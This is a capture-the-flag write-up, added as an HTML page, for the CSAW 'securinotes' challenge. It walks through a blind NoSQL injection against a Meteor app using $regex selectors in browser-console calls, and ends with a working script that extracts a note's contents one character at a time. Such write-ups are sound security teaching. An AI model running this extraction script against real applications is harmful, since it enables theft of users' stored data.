@@ -1,0 +1,82 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><title>securinotes</title><link href=https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css rel=stylesheet integrity=sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js integrity=sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa crossorigin=anonymous></script>
+<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Inconsolata&family=Poppins&display=swap" rel=stylesheet></head><body><style>.nav_shadow{box-shadow:0 0 14px rgba(0,0,0,.5);-webkit-box-shadow:0 0 14px 0 rgba(0,0,0,.5)}.navbar-custom{background-color:#333c33;font-size:16pt}.navbar-custom *{color:#fff;font-family:poppins,sans-serif}</style><nav class="navbar navbar-expand-lg navbar-dark nav_shadow navbar-custom"><div class=container><div class=container-fluid><button class=navbar-toggler type=button data-bs-toggle=collapse data-bs-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation">
+<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse" id=navbarSupportedContent><ul class="navbar-nav me-auto mb-2 mb-lg-0"><li class=nav-item><a class=nav-link href=/><strong>Home</strong></a></li><li class=nav-item><a class=nav-link href=/about/><strong>About</strong></a></li><li class=nav-item><a class=nav-link href=/roster/><strong>Roster</strong></a></li><li class=nav-item><a class=nav-link href=/writeups/><strong>Writeups</strong></a></li></ul></div></div></div></nav><br><div id=content><div class=container><h1>securinotes</h1><span>By CDT Daniel Chung
+<span><br><span>By CDT Jalen Morgan
+<span><br><hr class="hr hr-blurry"><p>A meteor vulnerability found in 2019 and using a note storage webpage as your password database&mldr;</p><h2 id=description>Description</h2><p>You have access to the SecuriNotes application. You overheard your coworker Terry talking about how he uses it as a password manager. What could possibly go wrong&mldr;</p><p>Author: h34d4ch3, RangeForce</p><p><a href=http://web.chal.csaw.io:5002>http://web.chal.csaw.io:5002</a></p><h2 id=tldr>TL;DR</h2><p>Webpage is running meteor, meteor has known blind nosql injection vulnerability. Exploit using web console and get flag.</p><h2 id=explanation>Explanation</h2><p><a href=https://medium.com/rangeforce/meteor-blind-nosql-injection-29211775cd01>https://medium.com/rangeforce/meteor-blind-nosql-injection-29211775cd01</a></p><pre tabindex=0><code>Meteor.call(&#34;notes.add&#34;, {}, console.log)
+// creates new note and returns -&gt; jELNgdCZxJoZm6TvL
+Meteor.call(&#34;notes.count&#34;, {&#34;_id&#34;: &#34;jELNgdCZxJoZm6TvL&#34;}, console.log)
+// returns -&gt; 1
+</code></pre><p>you&rsquo;re basically writing a js nosql injection to run in your console</p><p>testing stuff here</p><pre tabindex=0><code>Meteor.call(&#34;users.count&#34;, {
+    &#34;username&#34;: &#34;terry&#34;,
+    &#34;role&#34;: {$regex: &#39;^[a-m].*&#39;}
+}, console.log);
+
+
+Meteor.call(&#34;notes.count&#34;, {}, console.log)
+undefined
+undefined 43774
+
+Meteor.call(&#34;notes.count&#34;, {&#34;_id&#34;:&#34;vvfsYsjzuEP2BsSye&#34;}, console.log)
+
+Meteor.call(&#34;notes.count&#34;, {&#34;_id&#34;:&#34;vvfsYsjzuEP2BsSye&#34;}, console.log)
+undefined
+undefined 1
+
+Meteor.call(&#34;notes.count&#34;, {&#34;_id&#34;:{$regex: &#39;^[a-zA-Z0-9].*&#39;}}, console.log)
+undefined
+undefined 9756
+
+Meteor.user()
+Object { _id: &#34;cChso3FdudJHBCyg8&#34;, username: &#34;f0ur3y3s@gmail.com&#34; }
+
+Meteor.call(&#34;notes.find&#34;, {&#34;_id&#34;:&#34;vvfsYsjzuEP2BsSye&#34;}, console.log)
+undefined
+undefined 1
+
+Meteor.call(&#34;notes.count&#34;, {&#34;_id&#34;:{$regex: &#39;^[a-zA-Z0-9].*&#39;}}, console.log)
+undefined
+undefined 43974 meteor.js:1234:22
+Meteor.call(&#34;notes.count&#34;, {}, console.log)
+undefined
+undefined 43975
+</code></pre><p>find the id is the main part</p><p>originally thought that finding the id of terry was what we needed<br>but thats not going to work because we dont know his username</p><pre tabindex=0><code>Meteor.call(&#39;notes.count&#39;, {&#39;body&#39;: &#39;flag&#39;}, (err, res))
+</code></pre><p>Looking into app.js, we can see this function defined:</p><pre tabindex=0><code>Template.Layout_login.onCreated(function () {
+  var self = this;
+  this.notescount = new ReactiveVar(0);
+
+  function noteCountUpdater() {
+    Meteor.call(&#39;notes.count&#39;, {
+      body: {
+        $ne: &#39;&#39;
+      }
+    }, function (err, res) {
+      //console.log(res)
+      self.notescount.set(res);
+    });
+</code></pre><pre tabindex=0><code>Meteor.call(&#39;users.count&#39;, (err, res) =&gt; {
+  console.log(res);
+});
+</code></pre><p><a href=https://book.hacktricks.xyz/pentesting-web/nosql-injection>https://book.hacktricks.xyz/pentesting-web/nosql-injection</a></p><p><a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/split>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/split</a>
+use an index from the string <code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_</code></p><pre tabindex=0><code>&#39; abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_&#39;.split(&#39;&#39;)
+Array(66) [ &#34; &#34;, &#34;{&#34;, &#34;}&#34;, &#34;_&#34;, &#34;0&#34;, &#34;1&#34;, &#34;2&#34;, &#34;3&#34;, &#34;4&#34;, &#34;5&#34;, … ]
+</code></pre><p><a href=https://stackoverflow.com/questions/21824244/mongodb-regex-searching-issue-in-meteor>https://stackoverflow.com/questions/21824244/mongodb-regex-searching-issue-in-meteor</a>
+regex searching, we are searching for <code>flag{</code> + a character from our alphabet list</p><p><a href=https://www.w3schools.com/jsref/met_win_settimeout.asp>https://www.w3schools.com/jsref/met_win_settimeout.asp</a>
+set timeout</p><p><a href=https://www.netsparker.com/blog/web-security/what-is-nosql-injection/>https://www.netsparker.com/blog/web-security/what-is-nosql-injection/</a></p><p><a href="https://www.google.com/search?client=firefox-b-1-d&q=meteor+js+nosql+injection">https://www.google.com/search?client=firefox-b-1-d&q=meteor+js+nosql+injection</a></p><p><a href=https://www.neuralegion.com/blog/blind-sql-injection/>https://www.neuralegion.com/blog/blind-sql-injection/</a></p><p><a href=https://owasp.org/www-community/attacks/Blind_SQL_Injection>https://owasp.org/www-community/attacks/Blind_SQL_Injection</a></p><p><a href=https://book.hacktricks.xyz/pentesting-web/nosql-injection>https://book.hacktricks.xyz/pentesting-web/nosql-injection</a></p><h2 id=final-script>Final Script</h2><p>(function exploit(field, alphabet, data = &lsquo;&rsquo;, index = 0){
+Meteor.call(&rsquo;notes.count&rsquo;, {[field]: {$regex: data + alphabet[index]}}, (err, res) => {
+if (res == 0){
+index++;
+}
+else {
+data += alphabet[index];
+console.log(data, res);
+index = 0;
+}
+if (index >= alphabet.length) {
+console.log(&ldquo;Done&rdquo;, data);
+return;
+}
+setTimeout(function(){exploit(field, alphabet, data, index);});
+});
+})
+(&lsquo;body&rsquo;, &rsquo; abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_&rsquo;.split(&rsquo;&rsquo;), &lsquo;flag{&rsquo;);</p><h2 id=how-does-it-work>How does it work?</h2><ul><li>calls the notes.count function to check if the substring we have is equal to flag{.</li><li>we start off with the alphabet and our string as flag{.</li><li>we check if res==0 then we increase our index in the alphabet going to the next letter.</li><li>if its 1 then we add the letter to our flag{ string and print it out.</li><li>the alph len check is to prevent out of bounds errors.</li><li>the timeout sets the loop which is a js thing</li></ul><p><img src=/img/meteorexploit.JPG alt=exploit></p><h2 id=flag>Flag</h2><p>flag{4lly0Urb4s3}</p></div></div><footer class="footer mt-auto"><div class="container text-center text-muted"><p>Copyrights © 2022 BitsforEveryone. All rights reserved.</p><div class=social><a href=https://www.instagram.com/armywp_cyber/ class="fa fa-instagram"></a>
+<a href=https://github.com/bitsforeveryone class="fa fa-github"></a></div></div></footer></body></html>
